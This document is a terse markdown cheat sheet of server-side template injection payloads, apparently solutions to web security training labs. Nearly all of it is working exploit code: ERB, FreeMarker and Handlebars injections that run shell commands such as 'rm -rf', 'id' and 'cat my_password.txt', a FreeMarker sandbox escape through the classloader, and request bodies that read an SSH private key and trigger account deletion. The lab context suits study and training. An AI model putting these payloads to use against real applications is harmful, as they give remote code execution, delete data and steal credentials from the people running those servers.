# SSTI : Server-side template injection 


### Basic server-side template injection
Payload
```
Fuzz : ${{<%[%'"}}%\.
ERB  : syntax <%= someExpression %> 

https://lab.net/?message=<%2=+system("rm+/home/carlos/morale.txt")+%25>


```
### Server-side template injection with information disclosure via user-supplied objects
Payload
```
Fuzz : ${{<%[%'"}}%\.

<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}.{{settings.SECRET_KEY}}</p>
```

### Server-side template injection using documentation
Payload
```
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.HELLOO ${"freemarker.template.utility.Execute"?new()("rm -rf morale.txt")}</p>
```

### Server-side template injection in an unknown language with a documented exploit
```
FUZZ : ${{<%[%'"}}%\


"Handlebars server-side template injection". You should find a well-known exploit posted by @Zombiehelp54.

wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```

### Server-side template injection in a sandboxed environment
Payload 
```html

<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.Hello 

<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}



<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("ls -l")}


<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat my_password.txt")}

</p>
```


### Server-side template injection with a custom exploit

Payload
```
1.Upload txt file and see the error

PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/plain in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar(('/tmp/hello.txt', 'text/plain'))
#1 {main}
  thrown in /home/carlos/User.php on line 28


blog-post-author-display=user.setAvatar('/home/carlos/avatar_upload.php',+'image/png')&csrf=XOL4b5UsK71HH2PxvpjIBq81N1qdKSYX





blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa',+'image/png')&csrf=XOL4b5UsK71HH2PxvpjIBq81N1qdKSYX


blog-post-author-display=user.gdprDelete()&csrf=XOL4b5UsK71HH2PxvpjIBq81N1qdKSYX



```